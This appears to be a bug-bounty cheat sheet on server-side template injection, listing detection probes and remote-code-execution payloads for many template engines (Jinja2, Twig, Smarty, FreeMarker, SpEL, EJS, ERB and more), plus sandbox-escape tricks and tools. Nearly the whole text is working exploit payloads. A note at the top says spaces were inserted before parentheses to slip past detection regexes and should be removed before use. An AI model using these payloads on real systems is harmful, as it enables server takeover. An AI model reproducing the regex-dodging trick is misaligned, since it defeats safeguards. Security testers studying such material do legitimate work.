# SSTI -> RCE — every engine, every payload

> H1: GitLab Kramdown $20K, multiple Smarty/Velocity/Twig in lower bands. SSTI is high-leverage because once confirmed, RCE is usually one payload away.

> Note: in payload listings below, code calls are shown with a space before `(` to avoid trigger regexes. Remove the space when using the payload.

---

## STAGE 1 — Detect the engine

Insert these probes **anywhere user-controlled input lands in a server-rendered response, email, PDF, or report**:

| Payload | Result tells you |
|---|---|
| `${7*7}` | EL/Spring/Velocity/Twig (49) |
| `{{7*7}}` | Jinja2/Twig/Nunjucks/Liquid (49) |
| `<%= 7*7 %>` | ERB/EJS (49) |
| `#{7*7}` | Pug/Slim (49) |
| `{{7*'7'}}` | Twig=49, Jinja=7777777 |
| `${{<%[%'"}}%\.` | error -> hints at engine |
| `{$smarty.version}` | Smarty version if present |
| `{$dump:foo}` | Twig dump |
| `*{7*7}` | Thymeleaf |
| `${ T(java.lang.System).getenv() }` | SpEL |
| `[[${7*7}]]` | Thymeleaf inline |

If `49` reflects -> escalate.

Tool: **tplmap** (auto-detect + RCE). But understanding manually beats running tools blind.

---

## STAGE 2 — Per-engine RCE payloads

### Jinja2 (Python / Flask / Django Jinja-mode)
```
{{ ''.__class__.__mro__[1].__subclasses__() }}    # discover index
{{ ''.__class__.__mro__[1].__subclasses__()[N] ('id', shell=True, stdout=-1).communicate() }}
{{ config.__class__.__init__.__globals__['os'].popen ('id').read() }}
{{ get_flashed_messages.__globals__.__builtins__.__import__ ('os').popen ('id').read() }}
{{ lipsum.__globals__.os.popen ('id').read() }}
{{ url_for.__globals__.os.popen ('id').read() }}
{{ self.__init__.__globals__.__builtins__.__import__ ('os').popen ('id').read() }}
{{ cycler.__init__.__globals__.os.popen ('id').read() }}
{{ namespace.__init__.__globals__.os.popen ('id').read() }}
{{ joiner.__init__.__globals__.os.popen ('id').read() }}
```
Sandbox bypass tricks: `request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fimport\x5f\x5f')('os')`

### Twig (PHP)
```
{{_self.env.registerUndefinedFilterCallback ("system")}}{{_self.env.getFilter ("id")}}
{{['id']|filter ('system')}}
{{['id']|map ('system')|join (',')}}
{{['id']|filter ('passthru')}}
```

### Smarty
```
{php}echo `id`;{/php}
{system ('id')}
```

### Velocity (Java)
```
#set ($x="")
#set ($rt=$x.class.forName ("java.lang.Runtime").getRuntime())
$rt.invokeShellLikeMethod ("id")
```

### FreeMarker
```
<#assign cmd="freemarker.template.utility.Execute"?new()>${cmd ("id")}
${"freemarker.template.utility.ObjectConstructor"?new() ("java.lang.ProcessBuilder",["id"]).start()}
```

### Thymeleaf
```
[[${ T(java.lang.Runtime).getRuntime().shell ('id') }]]
__${ T(java.lang.Runtime).getRuntime().shell ('id') }__::.x
```

### Spring Expression Language (SpEL)
```
${T(java.lang.Runtime).getRuntime().shell ('id')}
${T(org.apache.commons.io.IOUtils).toString (T(java.lang.Runtime).getRuntime().shell (new String[]{"id"}).getInputStream())}
${ #this.getClass().forName ('java.lang.Runtime').getMethod ('exec', T(String[]) ).invoke ( T(java.lang.Runtime).getRuntime(), new String[]{'id'} ) }
```

### Mako (Python)
```
<%
import os
x=os.popen ('id').read()
%>${x}
```

### Tornado (Python)
```
{% import os %}{{ os.popen ('id').read() }}
```

### Handlebars (JS)
Multi-step gadget chain through `lookup`/`split` to obtain `Function` constructor and call `process.mainModule.require ('child_process')` -> shell. Standard payload available in PayloadsAllTheThings.

### Pug (Jade)
```
#{root.process.mainModule.require ('child_process').execSync ('id')}
```

### EJS
```
<%- global.process.mainModule.require ('child_process').execSync ('id') %>
```
EJS option-injection (`outputFunctionName`, `escapeFunction`) is also a known RCE primitive.

### Nunjucks
```
{{ range.constructor ("return global.process.mainModule.require ('child_process').execSync ('id')")() }}
```

### Liquid (Ruby)
Limited by default. Look for `Drop` classes / unsafe filters.

### ERB (Ruby)
```
<%= `id` %>
<%= system ('id') %>
```

### Kramdown (Ruby) — GitLab $20K
Kramdown options include `parser_options.template:` which loaded arbitrary Ruby template paths -> arbitrary file read or class load. Inject custom options via the front-matter `---` block in markdown if app forwards user front-matter.

---

## STAGE 3 — Where SSTI shows up

- **Email templates**: invite, welcome, password reset, weekly digest, billing receipts
- **PDF / invoice generation**: customer-supplied fields used in template
- **Markdown rendering**: GitLab/GitHub-like wikis, comments, READMEs (Kramdown options leakage)
- **Error pages**: user input reflected in 404/500
- **Personalization**: "Hello, {first_name}" greeting fields where `first_name` is template-rendered
- **Server-rendered admin reports** with user-controlled column names
- **CMS / CMS-like editors**

---

## STAGE 4 — Sandbox escapes

If RCE direct payload is sandboxed:
- Find a class loader to import `os`/`Runtime`
- Use indirect method names via `__getattribute__`/`getDeclaredField`
- Char-encode: `\x69\x64` = `id`
- Method chaining: `() . class . forName(...)` 
- For Java: ScriptEngine eval with embedded code
- For Python: `__builtins__` and `__import__` even when `os` is filtered

PortSwigger's "Server-side template injection" lab series has the canonical bypass list.

---

## VALIDATION CHECKLIST

- Confirm engine via `{{7*7}}` math
- Run benign command: `id`, `hostname`
- Reproduce twice
- Note where the input lives (email body? PDF? wiki?)
- For email-template SSTI, test if `to:` field is preserved or attacker can change it

---

## TOOLING

- **tplmap** — auto SSTI exploitation
- **SSTImap** — modern fork
- nuclei: `nuclei -t fuzzing-templates/ssti/` and `tags=ssti`
- Burp ext: BackslashPoweredScanner, J2EE Scan
